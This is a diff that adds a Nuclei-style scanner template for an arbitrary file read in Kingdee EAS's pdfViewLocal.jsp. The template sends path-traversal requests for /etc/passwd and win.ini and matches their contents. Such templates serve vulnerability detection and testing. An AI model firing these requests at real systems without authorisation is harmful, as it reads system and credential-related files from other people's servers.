@@ -1,0 +1,35 @@
+id: poc-yaml-kingdee-eas-pdfviewlocal-jsp-anyfile-read
+info:
+  name: Kingdee EAS pdfviewlocal.jsp Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  file:
+    - C:/windows/win.ini
+    - /etc/passwd
+
+http:
+  - method: GET
+    path:
+      - /plt_document/fragments/content/pdfViewLocal.jsp?path={{file}}
+    payloads:
+      file:
+        - C:/windows/win.ini
+        - /etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+      - type: dsl
+        dsl:
+          - |
+            contains(body, "[file]") && contains(body, "; for 16-bit app support") && !contains(body, "<")
+          - |
+            contains(body, "root:") && contains(body, "/bin") && !contains(body, "<")
